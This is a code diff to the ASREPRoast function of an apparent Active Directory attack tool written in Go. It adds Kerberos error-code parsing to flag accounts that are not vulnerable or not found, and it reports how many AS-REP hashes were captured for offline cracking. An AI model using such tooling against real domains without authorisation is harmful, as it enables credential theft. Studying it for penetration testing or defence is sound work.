@@ -3,6 +3,7 @@ package attacks
 import (
 	"context"
 	"fmt"
+	"strings"
 
 	"adreaper/internal/config"
 	"adreaper/internal/output"
@@ -65,17 +66,33 @@ func ASREPRoast(ctx context.Context, opts *config.Options, usersFile string) ([]
 		}
 		res, err := recon.ASREPHash(opts, user.SAMAccountName)
 		if err != nil {
-			if opts.Verbose {
-				output.Warn("  %s: %v", user.SAMAccountName, err)
+			errStr := err.Error()
+			if strings.Contains(errStr, "KDC Error: 25") || strings.Contains(errStr, "KDC_ERR_PREAUTH_REQUIRED") {
+				if usersFile != "" || opts.Verbose {
+					output.Warn("  [-] %s: Not vulnerable (Kerberos Pre-auth required)", user.SAMAccountName)
+				}
+			} else if strings.Contains(errStr, "KDC Error: 6") || strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN") {
+				if usersFile != "" || opts.Verbose {
+					output.Error("  [x] %s: Account not found in active directory", user.SAMAccountName)
+				}
+			} else {
+				if usersFile != "" || opts.Verbose {
+					output.Warn("  [!] %s: %v", user.SAMAccountName, err)
+				}
 			}
 			continue
 		}
 		hashes = append(hashes, res)
-		output.Success("  VULNERABLE: Account '%s' found with pre-authentication disabled.", user.SAMAccountName)
-		output.Info("  Hash capture successful! Saved for offline cracking.")
+		output.Success("  [+] VULNERABLE: Account '%s' found with pre-auth disabled.", user.SAMAccountName)
+		output.Info("      Hash capture successful! Saved for offline cracking.")
 	}
 
 	output.Info("")
+	if len(hashes) == 0 {
+		output.Warn("No AS-REP hashes were captured.")
+	} else {
+		output.Success("Successfully captured %d AS-REP hashes.", len(hashes))
+	}
 	return hashes, nil
 }
 
